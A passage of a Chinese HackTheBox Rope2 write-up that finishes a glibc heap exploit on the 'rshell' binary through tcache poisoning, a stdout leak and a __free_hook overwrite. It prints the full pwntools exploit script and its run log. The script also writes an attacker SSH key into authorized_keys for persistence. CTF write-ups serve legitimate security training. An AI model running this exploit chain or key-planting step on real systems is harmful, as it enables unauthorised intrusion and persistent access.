<p>将查看这个地址和&#x2F;proc&#x2F;$(pidof rshell)&#x2F;maps文件，以查看从它到libc基址的偏移量是0x1e7570。</p>
<ul>
<li>追加ASLR说明</li>
</ul>
<p>前面提到过，这里有一些关于ASLR的问题。正在修改底部的两个字节(或四个字节)。但只知道想要的low three nibbles是什么。因此，在猜测第四点。有2^4 &#x3D; 16个可能的值，所以1&#x2F;16的机会是正确的，6.25%尽管如此，仍然可以反复进行攻击，所以在10次尝试中，我有50%的几率成功，在20次尝试中，有75%的几率成功。将更新脚本以循环失败。</p>
<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><ul>
<li>写到__free_hook</li>
</ul>
<p>既然泄露了libc的消息，就可以被判死刑了。将用system覆盖__free_hook，然后释放一个包含”&#x2F;bin&#x2F;sh”的块。</p>
<p>遇到的第一个挑战是，不能释放指向_IO_2_1_stdout_的 “文件”，因为它将导致崩溃。这意味着从现在开始，只能使用一个文件。给出的第一个关于如何创建一个假块的例子实际上就是为这个做准备的。当最初到达这一点时，必须返回并在一开始添加它，以便它可以从这里获取(这意味着重新工作所有的间距等)。一旦这样做了，就达到了以下状态:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x00007ffff7fc4760] stdout  : </span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- fake1 from start, <span class="keyword">in</span> 0x60 tcache</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- real chunk B from start, <span class="keyword">in</span> 0x50 tcache</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000041</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000071</span><br><span class="line">-----------------------------------</span><br><span class="line">                  top: 0x55555555c490 (size : 0x20b70) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x55555555c3d0 (doubly linked list corruption 0x55555555c3d0 != 0x0 and 0x55555555c3d0 is broken)</span><br><span class="line">(0x20)   tcache_entry[0](5): 0x55555555c460 --&gt; 0x55555555c3e0 --&gt; 0x55555555c460 (overlap chunk with 0x55555555c450(freed) )</span><br><span class="line">(0x30)   tcache_entry[1](3): 0x55555555c430 --&gt; 0x55555555c430 (overlap chunk with 0x55555555c420(freed) )</span><br><span class="line">(0x40)   tcache_entry[2](255): 0xfbad2887 (invalid memory)</span><br><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0                                             &lt;-- B</span><br><span class="line">(0x60)   tcache_entry[4](1): 0x55555555c290 (overlap chunk with 0x55555555c2a0(freed) ) &lt;-- fake1</span><br><span class="line">(0x80)   tcache_entry[6](2): 0x55555555c400 (overlap chunk with 0x55555555c450(freed) )</span><br><span class="line">(0xa0)   tcache_entry[8](7): 0x55555555c3e0 (overlap chunk with 0x55555555c3d0(freed) )</span><br></pre></td></tr></table></figure>

<p>因此，可以获得块fake1，并使用它来修改当前位于0x50 tcache中的块B。如果用一个指针替换当前为null(表示链表的结束)的第一个单词，该指针有效地连接了tcache列表。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;K&#x27;</span>, 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-8)) <span class="comment"># add free hook to tcache 0x50</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;K&#x27;</span>)               <span class="comment"># free file</span></span><br></pre></td></tr></table></figure>

<p>运行完这些之后，指针被添加:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000055555555c010</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x55555555c2b0: 0x00007ffff7fc65a0      0x000055555555000a  &lt;-- free_hook <span class="keyword">in</span> tcache</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>在heapinfo中显示:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0x50)   tcache_entry[3](1): 0x55555555c2b0 --&gt; 0x7ffff7fc65a0</span><br></pre></td></tr></table></figure>

<p>需要去掉2b0块:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clear from tcache with add, shrink, rm</span></span><br><span class="line">add(<span class="string">&#x27;J&#x27;</span>, 0x40)</span><br><span class="line">edit(<span class="string">&#x27;J&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;J&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在只要添加一个0x40字节的条目，然后释放它。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;hook&#x27;</span>, 0x40, b<span class="string">&quot;/bin/sh\x00&quot;</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;hook&#x27;</span>, <span class="built_in">wait</span>=False)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>__free_hook Payload</li>
</ul>
<p>payload也有点棘手。一旦写入__free_hook，不能释放它而不造成崩溃，所以两个文件都被有效地使用了。 为了解决这个问题，将把这个块指向__free_hook之前的8个字节。将用”&#x2F;bin&#x2F;sh\x00”覆盖这些字节，然后继续系统地址。这样，当程序读取块内容(或将其传递给_free_hook)时，就会得到字符串“&#x2F;bin&#x2F;sh”。</p>
<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>最后的脚本在这里。因为PwnTools中的shell不是很好，所以为远程目标添加了一行代码，以便自动编写创建authorized_keys文件，这样就可以直接跳转到SSH连接。</p>
<ul>
<li>pwn_rshell.py</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">import pdb</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">prompt = <span class="string">&#x27;$ &#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">ls</span>():</span><br><span class="line">    p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> res.split(b<span class="string">&#x27;\n&#x27;</span>)[:-1]:</span><br><span class="line">        <span class="built_in">print</span>(line.decode())</span><br><span class="line"></span><br><span class="line">def add(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;add &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res.endswith(prompt.encode()): </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    res = p.recvuntil(prompt)</span><br><span class="line">    <span class="built_in">return</span> res</span><br><span class="line">    </span><br><span class="line">def <span class="built_in">rm</span>(name, <span class="built_in">wait</span>=True):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;rm &#123;name&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">wait</span>:</span><br><span class="line">        p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">def edit(name, size, content=<span class="string">&#x27;x&#x27;</span>):</span><br><span class="line">    p.sendline(f<span class="string">&#x27;edit &#123;name&#125;&#x27;</span>)</span><br><span class="line">    res = p.recvuntil((&#x27;size: &#x27;, prompt))</span><br><span class="line">    <span class="keyword">if</span> res == prompt: </span><br><span class="line">        pdb.set_trace()</span><br><span class="line">        <span class="built_in">return</span></span><br><span class="line">    p.sendline(f<span class="string">&#x27;&#123;size&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size &gt; 0:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line">    p.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rshell = ELF(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6-ropetwo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    remote = ssh(host=<span class="string">&#x27;10.10.10.196&#x27;</span>, user=<span class="string">&#x27;chromeuser&#x27;</span>, keyfile=<span class="string">&#x27;/root/hackthebox/machine/rope2/id_rsa&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        p = remote.run(<span class="string">&#x27;rshell&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./rshell&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create overlaps for end</span></span><br><span class="line">    add(<span class="string">&#x27;A&#x27;</span>, 0x40, p64(0)*5 + p64(0x61) + p64(0))   <span class="comment"># A at 260 in f1</span></span><br><span class="line">    add(<span class="string">&#x27;B&#x27;</span>, 0x40)                                  <span class="comment"># B at 2b0 in f2</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;A&#x27;</span>)                                         <span class="comment"># A in 0x50 tcache, f1 empty</span></span><br><span class="line">    edit(<span class="string">&#x27;B&#x27;</span>, 0)                                    <span class="comment"># B -&gt; A in 0x50 tcache, f2 still B</span></span><br><span class="line">    add(<span class="string">&#x27;B2&#x27;</span>, 0x40)                                 <span class="comment"># A in 0x50 tcache, f1 &amp; f2 -&gt; B</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)                                         <span class="comment"># B -&gt; A in 0x50 tcache, f1 -&gt; B</span></span><br><span class="line">    edit(<span class="string">&#x27;B2&#x27;</span>, 0x40, <span class="string">&#x27;\x90&#x27;</span>)                        <span class="comment"># B -&gt; fake1 in 0x50 tcache, f1 -&gt; B</span></span><br><span class="line">    add(<span class="string">&#x27;B3&#x27;</span>, 0x40)                                 <span class="comment"># fake in 0x50 tcache, f2 -&gt; B</span></span><br><span class="line">    edit(<span class="string">&#x27;B3&#x27;</span>, 0x20)                                <span class="comment"># B-end in 0x20 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B3&#x27;</span>)                                        <span class="comment"># B in 0x30 tcache</span></span><br><span class="line">    add(<span class="string">&#x27;fake1&#x27;</span>, 0x40, p64(0)*3 + p64(0x51) + p64(0))</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;fake1&#x27;</span>)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;x&#x27;</span>, 0x30)                                  <span class="comment"># add for spacing</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;C&#x27;</span>, 0x60)   <span class="comment"># create block to be freed and steal pointer in tcache - C = 340</span></span><br><span class="line">    add(<span class="string">&#x27;D&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0)) <span class="comment"># create block and fake block to put fake block meta in place - D = 3b0</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;D&#x27;</span>) <span class="comment"># D in tcache 0x80</span></span><br><span class="line">    add(<span class="string">&#x27;E&#x27;</span>, 0x60, p64(0x21)*11)   <span class="comment"># create second 0x60, E, and spray with 0x21 for next block meta fake later, E = 430</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;C&#x27;</span>)               <span class="comment"># f1 empty, C in 0x70 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;E&#x27;</span>, 0)      <span class="comment"># slot 2 -&gt; E, E-&gt;C in 0x70 tcache</span></span><br><span class="line">    add(<span class="string">&#x27;E2&#x27;</span>, 0x60)  <span class="comment"># slots 1 and 2 -&gt; E, C in 0x70 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;E&#x27;</span>)               <span class="comment"># slot 1 -&gt; E, E -&gt; C in 0x70 tache</span></span><br><span class="line">    edit(<span class="string">&#x27;E2&#x27;</span>, 0x60, b<span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># edit tcache pointer, C -&gt; fake2 in 0x70 tcache</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># next three fetch C from tcache, and get rid of it without putting it back in 0x70 tcache</span></span><br><span class="line">    add(<span class="string">&#x27;E3&#x27;</span>, 0x60)   <span class="comment"># fetch E, fake in 0x70 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;E3&#x27;</span>, 0x20)  <span class="comment"># E-end in 0x30 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;E3&#x27;</span>)          <span class="comment"># E in 0x50 tcache</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;fake2&#x27;</span>, 0x60, p64(0)*9 + p64(0x31) + p64(0))   <span class="comment"># get fake block, change key for E</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;E2&#x27;</span>) <span class="comment"># C</span></span><br><span class="line">    add(<span class="string">&#x27;B&#x27;</span>, 0x70) <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free fake to fill tcache, then overwrite key protecting from double free</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(7):</span><br><span class="line">        edit(<span class="string">&#x27;fake2&#x27;</span>, 0x0)    <span class="comment"># free fake block, put 2f0 in 0x90 tcache</span></span><br><span class="line">        edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + p64(0) + chr(i).encode()) <span class="comment"># B</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>) <span class="comment"># B</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;fake2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify libc address</span></span><br><span class="line">    add(<span class="string">&#x27;B&#x27;</span>, 0x70)</span><br><span class="line">    edit(<span class="string">&#x27;B&#x27;</span>, 0x70, p64(0)*5 + p64(0xa1) + b<span class="string">&quot;\x60\x47&quot;</span>)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&#x27;F&#x27;</span>, 0x30)           <span class="comment"># fetch 460 chunk from tcache, 300 still in 0x40 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;F&#x27;</span>, 0)             <span class="comment"># 460 -&gt; 300 in 0x40 tcache, f1 -&gt; 460</span></span><br><span class="line">    add(<span class="string">&#x27;F2&#x27;</span>, 0x30)          <span class="comment"># f1 and f2 -&gt; 460, 300 in 0x40 tcache</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;F&#x27;</span>)                  <span class="comment"># f2 -&gt; 460, 460 -&gt; 300 in 0x40 tcache</span></span><br><span class="line">    edit(<span class="string">&#x27;F2&#x27;</span>, 0x30, <span class="string">&#x27;\xe0&#x27;</span>) <span class="comment"># 460 -&gt; 3e0 -&gt; stdout in 0x40 tcache</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get 460 from tcahce, shrink it, and release it</span></span><br><span class="line">    add(<span class="string">&#x27;F3&#x27;</span>, 0x30)</span><br><span class="line">    edit(<span class="string">&#x27;F3&#x27;</span>, 0x10)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;F3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get 3e0 from tcache, shrink it, and release it</span></span><br><span class="line">    add(<span class="string">&#x27;fake3&#x27;</span>, 0x30)       </span><br><span class="line">    edit(<span class="string">&#x27;fake3&#x27;</span>, 0x10)</span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;fake3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean up F2</span></span><br><span class="line">    edit(<span class="string">&#x27;F2&#x27;</span>, 0x10, p64(0)*2) <span class="comment"># overwrtie pointer and key to allow double free</span></span><br><span class="line">    <span class="built_in">rm</span>(<span class="string">&#x27;F2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        leak = add(<span class="string">&#x27;stdout&#x27;</span>, 0x30, p64(0xfbad1800) + p64(0)*2 + b<span class="string">&quot;\x00&quot;</span>*7)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&#x27;\x7f&#x27;</span> not <span class="keyword">in</span> leak:</span><br><span class="line">            log.failure(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    except EOFError:</span><br><span class="line">        log.failure(<span class="string">&quot;Failed&quot;</span>)</span><br><span class="line"></span><br><span class="line">leaked_addr = u64(leak[8:16])</span><br><span class="line">log.success(f<span class="string">&#x27;Leaked address: 0x&#123;leaked_addr:x&#125;&#x27;</span>)</span><br><span class="line">libc.address = leaked_addr - 0x1e7570</span><br><span class="line">log.success(f<span class="string">&#x27;Libc base: 0x&#123;libc.address:x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Overwriting __free_hook&quot;</span>)</span><br><span class="line">add(<span class="string">&#x27;K&#x27;</span>, 0x50, p64(0)*3 + p64(0x51) + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-8)) <span class="comment"># add free hook to tcache 0x50</span></span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;K&#x27;</span>)               <span class="comment"># free file</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear from tcache with add, shrink, rm</span></span><br><span class="line">add(<span class="string">&#x27;J&#x27;</span>, 0x40)</span><br><span class="line">edit(<span class="string">&#x27;J&#x27;</span>, 0x10)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;J&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;hook&#x27;</span>, 0x40, b<span class="string">&quot;/bin/sh\x00&quot;</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">log.info(<span class="string">&quot;Triggering shell&quot;</span>)</span><br><span class="line"><span class="built_in">rm</span>(<span class="string">&#x27;hook&#x27;</span>, <span class="built_in">wait</span>=False)</span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p.sendline(<span class="string">&#x27;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+Tuty8485wlno7YD87opBzB3ehsFJN475yHgPuJV+t1oAk7UwtpLQLWbqa5SCpNbJtCeOK5L/He/F0Oe2D0UOZ5klMrcQGWqml1SpQTPHlpRQbTLdi6mMcsKhyHdJV5RqtqfFnPNdS4qF7k6COpOr/9S/UOr1V/zy/0vd2Bqqf9+K5s8xc+kNnfhfnYjWdlXP/avMFg7kRm4bTxJXlI2gGKF3LTw/iIbZ+5o/jY68UFq1NXk3Gtuv0ObVaRDU5f/7SlfqHKJUjQKkaqUdpAYOyGUY9uorYJe9GGor5+YyYysKCXkbhFvr28KqK/FsSBKCdEQM+z1nwyLXA2EArcqbgM6GQrfRcdHTmaMwP+Ti4F9iFD6r1DVrJpKZ4HinpDRtvQQncmtaUew5t78Z8a55zMWqV90A447y0Qg0nRxEa8gDr/PHOvcUmpKy3ocmwKD7x8ZEgNRvpm0INCOOcnjasddE/zrukoo1+fwzNB3R2lnghsNa8ShoctkAbgZmrSU= root@kali&quot; &gt; /home/r4j/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod 600 /home/r4j/.ssh/authorized_keys&quot;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;Wrote SSH key to /home/r4j/.ssh/authorized_keys&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行它会返回一个shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># python3 pwn_rshell.py REMOTE</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/rshell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/libc.so.6-ropetwo&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Connecting to 10.10.10.196 on port 22: Done</span><br><span class="line">[ERROR] python is not installed on the remote system <span class="string">&#x27;10.10.10.196&#x27;</span></span><br><span class="line">[*] chromeuser@10.10.10.196:</span><br><span class="line">    Distro    Unknown Unknown</span><br><span class="line">    OS:       Unknown</span><br><span class="line">    Arch:     Unknown</span><br><span class="line">    Version:  0.0.0</span><br><span class="line">    ASLR:     Disabled</span><br><span class="line">    Note:     Susceptible to ASLR <span class="built_in">ulimit</span> trick (CVE-2016-3672)</span><br><span class="line">[+] Opening new channel: <span class="string">&#x27;rshell&#x27;</span>: Done</span><br><span class="line">[-] Failed</span><br><span class="line">[+] Opening new channel: <span class="string">&#x27;rshell&#x27;</span>: Done</span><br><span class="line">[-] Failed</span><br><span class="line">[+] Opening new channel: <span class="string">&#x27;rshell&#x27;</span>: Done</span><br><span class="line">[+] Leaked address: 0x7f96ffdd6570</span><br><span class="line">[+] Libc base: 0x7f96ffbef000</span><br><span class="line">[*] Overwriting __free_hook</span><br><span class="line">[*] Triggering shell</span><br><span class="line">[+] Wrote SSH key to /home/r4j/.ssh/authorized_keys</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ $ $ $ <span class="built_in">id</span></span><br><span class="line">uid=1000(r4j) gid=1001(chromeuser) <span class="built_in">groups</span>=1001(chromeuser)</span><br><span class="line">$ $ <span class="built_in">whoami</span></span><br><span class="line">r4j</span><br><span class="line">$ $ <span class="built_in">ls</span></span><br><span class="line">chrome    web</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell.jpg"></li>
</ul>
<p>SSH也可以正常连接:</p>
